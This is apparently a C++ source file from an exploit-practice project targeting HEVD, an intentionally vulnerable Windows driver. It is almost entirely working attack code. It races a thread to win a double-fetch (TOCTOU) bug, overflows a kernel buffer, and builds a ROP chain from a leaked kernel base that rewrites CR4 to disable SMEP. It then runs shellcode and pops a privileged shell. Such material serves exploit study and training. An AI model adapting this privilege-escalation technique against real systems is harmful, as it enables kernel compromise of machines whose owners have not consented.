#include "DoubleFetch.hpp"
#include "PreExploitation.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"

#include <thread>
#include <chrono>

namespace DoubleFetch
{

void disable_smep_rop(ByteVector& in_buffer, Address64 shellcode_address)
{
	const size_t return_address_offset = KERNEL_BUFFER_SIZE + 0x8;
	std::memset(in_buffer.data(), 0xAA, return_address_offset);
	
	const Address64 ntos_address = PreExploitation::leak_ntos_base();

	static constexpr Address64 WANTED_CR4_VALUE = 0xFFFEFFFFF;
	const Address64 POP_RCX = ntos_address + 0x2157e5;
	const Address64 MOV_CR4_RCX = ntos_address + 0x47bf97; // This one is a better cr4 gadget because it is not in the hal functions

	std::vector<Address64> rop_chain_raw = {
		POP_RCX,
		WANTED_CR4_VALUE,
		MOV_CR4_RCX,
		shellcode_address
	};

	size_t current_index = return_address_offset;
	for (Address64 current_gadget : rop_chain_raw)
	{
		std::memcpy(in_buffer.data() + current_index, &current_gadget, sizeof(Address64));
		current_index += sizeof(Address64);
	}
}

void race_thread(UNUSED(ByteVector& data_buffer_to_change), UNUSED(size_t old_size), UNUSED(size_t new_size), UNUSED(size_t offset))
{
	static constexpr size_t TIME_TO_RACE = 5;
	static const std::chrono::seconds run_duration = std::chrono::seconds(TIME_TO_RACE);
	static const std::chrono::steady_clock::time_point start_time = std::chrono::steady_clock::now();

	while (std::chrono::steady_clock::now() - start_time < run_duration)
	{
		std::memcpy(data_buffer_to_change.data() + offset, &new_size, sizeof(size_t));
		std::memcpy(data_buffer_to_change.data() + offset, &old_size, sizeof(size_t));
	}
}

void run_race_thread(ByteVector& data_buffer_to_change, size_t old_size, size_t new_size, size_t offset)
{
	std::thread(race_thread, std::ref(data_buffer_to_change), old_size, new_size, offset).detach();
}

void exploit()
{
	// This time I'll do a simpler rop chain, that will have the wanted cr4 value on the stack and will just use `pop rax` `mov cr4, rax` (and will reoslve the gadgets' addresses from the KASLR leak)

	DEBUG_PRINT("[+] Starting double fetch exploit...\n");

	HEVDCommunication hevd;

	ByteVector overflow_buffer;
	overflow_buffer.resize(OVERFLOW_BUFFER_SIZE);

	Address64 shellcode_address = PreExploitation::prepare_shellcode();
	DEBUG_PRINT("[+] Shellcode Address -> ");
	DEBUG_PRINT(std::to_string(shellcode_address));
	disable_smep_rop(overflow_buffer, shellcode_address);

	ByteVector in_buffer;
	in_buffer.resize(sizeof(DoubleFetchParams));

	DoubleFetchParams double_fetch = { .buffer = reinterpret_cast<Address64>(overflow_buffer.data()), .buffer_size = KERNEL_BUFFER_SIZE };
	std::memcpy(in_buffer.data(), &double_fetch, sizeof(DoubleFetchParams));

	run_race_thread(in_buffer, KERNEL_BUFFER_SIZE, OVERFLOW_BUFFER_SIZE, offsetof(DoubleFetchParams, buffer_size));
	DEBUG_PRINT("[+] Race thread initialized!\n[+] Exploiting TOCTOU...");

	static constexpr size_t TIME_TO_RACE = 4;
	static const std::chrono::seconds run_duration = std::chrono::seconds(TIME_TO_RACE);
	static const std::chrono::steady_clock::time_point start_time = std::chrono::steady_clock::now();
	while (std::chrono::steady_clock::now() - start_time < run_duration)
	{
		std::ignore = hevd.call_ioctl(DOUBLE_FETCH_IOCTL, in_buffer, sizeof(Address64));
	}

	DEBUG_PRINT("[+] Popping a shell\n");
	PostExploitation::pop_shell();
}

}